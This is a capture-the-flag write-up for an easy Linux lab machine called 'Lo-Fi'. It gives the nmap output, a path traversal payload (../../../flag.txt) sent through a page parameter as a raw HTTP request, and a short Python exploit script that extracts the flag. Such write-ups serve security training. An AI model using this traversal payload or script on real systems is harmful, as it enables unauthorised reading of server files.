# Writeup: Lo-Fi

**OS**: 🐧 Linux

**Level**: 🟢 Easy

## 🔎 Enumeration:

Nmap scan:

```shell
nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan $TARGET
```

Result:

```
# Nmap 7.95 scan initiated Sat Sep 13 13:30:54 2025 as: /usr/lib/nmap/nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan 10.10.0.157
Nmap scan report for 10.10.0.157
Host is up, received user-set (0.096s latency).
Scanned at 2025-09-13 13:30:54 CEST for 120s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 47:c8:40:3e:33:ea:ee:0a:c3:70:4a:17:12:be:d9:3f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDC7x6tdadCuM3SeqpYlsa3Ez8xi1xAPsyVxDnue7a4jQi3q/o+hlgGbXTJ+0vEQFwDjdLJ65mNh1zs5Lf9q/+GbXFwea2sT42wNafkA5fJKMq7swvA/683Nfd6H2hciLdk6PYNL1HCKvacfCnoNQWiEUPeclnx5xZ5NUTFzPKbA45pPSFY9dRDrz2Z9QIvXENflVQEEhocl8nijBxuxGM+1/RWvrqwvp9eJNhDFhSEMXVyhMNmZNjIwi6GZZaHediscYs1GOe25095YA0HHvpI1c0/e1ZFoNdAYLOrStHImBlGKTYQFaoFsMiHaI0TlUlIw+1l5SrEnjXK1hSZD9scNGeGbpstd26nq1TWAy0LTjQzlSKtyslzwZHyCn/wn5qz9rahEKsNMRkOGJYV1Lgoo4uruJ+og1YlOxw6uCZdG0wjs4y1nVeW51krSdsESxc7qes/tFi3Se2nFbvZtkr/JkgwUPd49Fd0Twwo80/ewj8lFJeS58R81qhTrpnj0iE=
|   256 f2:f1:12:ee:77:a0:30:e3:24:82:18:ee:25:e1:4b:37 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBmUgigVNJf6CdzlI0JN6R14+LExP/C8XKdRPgzBhZ/MSHLXun4bPwrCzuHIotT4u0Ot0RRdVqNQtFGSkOq4OIc=
|   256 5a:46:8d:23:1f:53:81:81:34:5c:2b:50:15:09:f4:f1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM7fx+DYFkRxAG7nmwM2oP8MVvfR9DykybsiZPilktRK
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Lo-Fi Music
|_http-server-header: Apache/2.2.22 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 13 13:32:54 2025 -- 1 IP address (1 host up) scanned in 120.18 seconds
```

## 💥 Exploitation:

On port 80 i found a webserver. After i clicked tthe `Relax` link on the the page i found a `?page=relax.php` query parameter so i did send the request to repeater and added a `./` to the request, which gives me back a `200 OK` so path traversal is possible. With the payload `../../../flag.txt` i got the flag.

```http
GET /?page=../../../flag.txt HTTP/1.1
Host: 10.10.0.157
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://10.10.0.157/
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Since this one was a little bit short to solve i decided to write a python script which just gives me back the flag.

### exploit.py

```python
#!/usr/bin/env python3

import re
import sys
import urllib3
import requests

PAYLOAD = '/?page=../../../../flag.txt'

def main():
    if len(sys.argv) < 2:
        print('Usage: exploit.py [URL]')
        sys.exit(1)

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    url = sys.argv[1]
    exploit_url = url + PAYLOAD

    proxies = {
            'http': '127.0.0.1:8080',
            'https': '127.0.0.1:8080'
            }

    headers = {
            'User-Agent': 'EXPLOIT'
            }

    r = requests.get(exploit_url, headers=headers, proxies=proxies, verify=False)

    if 'flag{' in r.text:
        match = re.search(r'flag\{[a-f0-9]+\}', r.text)
        print(match.group(0))
    else:
        print('exploit failed !')

if __name__ == '__main__':
    main()
```

## 🔓 Priviledge Escalation:

none

## 💰 Loot:

```shell
# flag.txt
flag{e4478e0eab69bd642b8238**********}
```